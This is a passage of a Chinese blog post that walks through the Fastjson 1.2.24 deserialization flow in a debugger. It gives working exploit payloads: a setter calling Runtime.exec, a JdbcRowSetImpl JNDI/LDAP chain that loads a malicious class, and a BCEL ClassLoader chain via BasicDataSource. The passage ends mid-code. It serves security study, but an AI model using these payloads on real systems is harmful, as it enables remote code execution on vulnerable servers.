+<p>也就是只要字段getOnly为true使得asmEnable为false，那么我们就不会像刚才那样返回一个asmFactory的创建反序列化器的方法，而是走到new JavaBeanDeserializer，这样子我们就可以好好地进行调试了</p>
+<p>那么getOnly的值只有在下面这一处可以改</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216164050408.png" alt="image-20250216164050408"></p>
+<p>FieldInfo中的getOnly处，判断方法的参数是否为1，不是的话getOnly就为true</p>
+<p>然后在前面的setter方法的循环中，我们可以看到要是参数值不为1的话会直接跳出循环，都走不到<code>add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)null));</code>处，自然也就修改不了getOnly的值</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216165231488.png" alt="image-20250216165231488"></p>
+<p>因此我们只能够通过getter方法来进行修改，也就是通过一个对象，与其对应的只有一个getter（如果有setter会优先调用setter而不会调用getter）</p>
+<p>但是上面分析过了调用这个getter需要getter的返回值满足那几种类型（Collection、Map等），但是问题不大，Person类修改为如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Map map;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person constructor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Map <span class="title function_">getMap</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getMap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改完后我们重新调试一下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216170235499.png" alt="image-20250216170235499"></p>
+<p>成功修改</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216170607224.png" alt="image-20250216170607224"></p>
+<p>成功关掉开关，于是我们返回的就是一个JavaBeanDeserializer</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216170640421.png" alt="image-20250216170640421"></p>
+<p>于是我们也就能正常地进行调试了（上面忙活这么多就是为了能正常地调试）</p>
+<p>这一次的derializer和上次的相比多了一个map字段</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216171035377.png" alt="image-20250216171035377"></p>
+<p>然后获取到了之后我们就调用它的反序列化方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216171214305.png" alt="image-20250216171214305"></p>
+<p>一直跟进deseralize方法</p>
+<p>358行开始对每个字段遍历进行实例化赋值操作</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216202643895.png" alt="image-20250216202643895"></p>
+<p>580行，步入createInstance方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216203036623.png" alt="image-20250216203036623"></p>
+<p>该函数先进行一个判断是否是接口，是的话就生成一个代理；不是的话就调用其自己的默认构造函数来进行实例化，再return object回去</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216203404076.png" alt="image-20250216203404076"></p>
+<p>继续往下走，走到setValue()处，开始给字段赋值了，这是最重要的一部分</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216212944687.png" alt="image-20250216212944687"></p>
+<p>一路往下走，来到了一处反射，调用setter来完成赋值</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20241027034134274.png" alt="image-20241027034134274"></p>
+<p>步过，控制台输出setName</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20241027034354283.png" alt="image-20241027034354283"></p>
+<p>age的赋值同理，</p>
+<p>至此一整个反序列化的流程结束</p>
+<p>回到前面，成功拿到了Person对象</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216214132318.png" alt="image-20250216214132318"></p>
+<p>在继续往下走的过程来到toJSON()，会调用getter</p>
+<p>这个过程就是前面一步是把字符串转换为了对象，然后这一步是把对象转换为JSON字符串</p>
+<p>我们跟进去，往下走到这一步</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216220308621.png" alt="image-20250216220308621"></p>
+<p>该行代码会获取到一个与指定类clazz关联的对象序列化器</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216220902886.png" alt="image-20250216220902886"></p>
+<p>往下走到这一步，跟进去</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216220949521.png" alt="image-20250216220949521"></p>
+<p>会在这里获取值，跟进getPropertyValue方法里</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216221034445.png" alt="image-20250216221034445"></p>
+<p>然后我们再跟进get方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216221210505.png" alt="image-20250216221210505"></p>
+<p>在这里面会反射调用getter方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216221300808.png" alt="image-20250216221300808"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250216221502021.png" alt="image-20250216221502021"></p>
+<p>到这里基本的流程差不多就结束</p>
+<p>从上面我们可以得知在反序列化过程中会自动调用setter方法，也就是说我们只要有一个类，其中有一个setter方法中有危险函数，那么我们就可以实行攻击</p>
+<p>修改一下Person类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Map map;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person constructor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Map <span class="title function_">getMap</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getMap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONUnser</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot; : \&quot;org.example.Person\&quot;, \&quot;age\&quot; : 18, \&quot;name\&quot; : \&quot;Sherlock\&quot;, \&quot;cmd\&quot; : \&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(s);</span><br><span class="line">        System.out.println(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行后成功弹出计算器</p>
+<h1 id="1-2-24利用"><a href="#1-2-24利用" class="headerlink" title="1.2.24利用"></a>1.2.24利用</h1><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>在connect()方法下面存在明显的jndi注入</p>
+<p>lookup的参数是通过getter来获取的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250219111759266.png"></p>
+<p>我们要怎么判断变量可控，就是变量要有对应的setter或者是public或者是满足条件的getter（具体可以去看JavaBeanInfo.java文件中的对应代码）</p>
+<p>因此<code>this.getDataSourceName()</code>变量可控（由jndi相关知识可知这是一个地址），因为点进去下面就是对应的setter方法</p>
+<p>接下来就继续往上找，找connect方法是否在getter或者setter中</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250219152601348.png" alt="image-20250219152601348"></p>
+<p>由上面逻辑调试中的分析，想调用getter有两种途径：</p>
+<p>1、返回值规定的那些个getter才能被add到fieldList中后续被调用，但是这里的返回值DatabaseMetaData显然不符合要求</p>
+<p>2、需要能走到toJSON，而走到toJSON需要保证到你这需要的getter之前的所有getter流程不抛出异常，能正常invoke</p>
+<p>但是这里第一个方法就gg了没invoke成功</p>
+<p><a target="_blank" rel="noopener" href="https://blog.potatowo.top/2024/10/24/fastjson/image-20241027041507451.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20241027041507451.png" alt="img"></a></p>
+<p>因此只能走setter，也就是setAutoCommit方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250219152801243.png" alt="image-20250219152801243"></p>
+<p>先开启LDAP服务器并在7777端口挂载好恶意类</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250219154605208.png" alt="image-20250219154605208"></p>
+<p>payload如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonJdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://localhost:10389/cn=test,dc=example,dc=com\&quot;,\&quot;AutoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试，成功弹出计算器</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250219154316444.png" alt="image-20250219154316444"></p>
+<p>这条链由于是利用了jndi注入，所以会受到版本限制(jdk&lt;8u191)、依赖限制，同时还需要出网才可以</p>
+<h2 id="bcel-ClassLoader-不出网"><a href="#bcel-ClassLoader-不出网" class="headerlink" title="bcel.ClassLoader(不出网)"></a>bcel.ClassLoader(不出网)</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250219155527408.png" alt="image-20250219155527408"></p>
+<p>我们要利用的是该类中的loadClass方法，该方法中主要利用部分如下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250219160928161.png" alt="image-20250219160928161"></p>
+<p>类名满足一定条件后会执行createClass方法生成类，然后再用defineClass方法进行字节码加载</p>
+<p>我们先单纯利用该方法不涉及到fastjson来测试一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\mycode\\tmp\\T.class&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line">        str = <span class="string">&quot;$$BCEL$$&quot;</span> + str;</span><br><span class="line">        classLoader.loadClass(str).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行后会成功弹出计算器，至于为什么代码中有一行encode呢，这是因为上面的createClass方法中会有一个decode方法，所以相应的我们就需要来个encode方法喽</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250219162222585.png" alt="image-20250219162222585"></p>
+<p>ok，接下来我们就要想办法调用到loadClass方法了</p>
+<p>引入依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们所找的类为BasicDataSource，所需要的方法为createConnectionFactory()</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250219193859684.png" alt="image-20250219193859684"></p>
+<p>我们可以知道该方法中通过forName函数来加载类，现在我们就要看driverClassName和driverClassLoader有没有对应的setter方法</p>
+<p>（forName方法的底层就是调用loadClass方法）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250219194226298.png" alt="image-20250219194226298"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250219194252023.png" alt="image-20250219194252023"></p>
+<p>两个变量都可控</p>
+<p>现在我们再从createConnectionFactory()方法向上查找，看看会不会在setter或getter中</p>
+<p>走到createDataSource()，再向上查找走到了getConnection()（还在同一个文件内）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../source/imgs/$%7Bfiilname%7D/image-20250219194648742.png" alt="image-20250219194648742"></p>
+<p>可以看到是一个getter方法，返回类型不满足那几种，所以就是在toJson方法中调用的getter方法</p>
+<p>正向漏洞代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\tmp\\Test.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//        System.out.println(str);</span></span><br><span class="line"></span><br><span class="line">        str = <span class="string">&quot;$$BCEL$$&quot;</span> + str;</span><br><span class="line"></span><br><span class="line">        <span class="type">BasicDataSource</span> <span class="variable">basicDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicDataSource</span>();</span><br><span class="line">        basicDataSource.setDriverClassName(str);</span><br><span class="line">        basicDataSource.setDriverClassLoader(classLoader);</span><br><span class="line">        basicDataSource.getConnection();</span><br></pre></td></tr></table></figure>
+
+<p>验证时可以的，所以我们的payload如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span 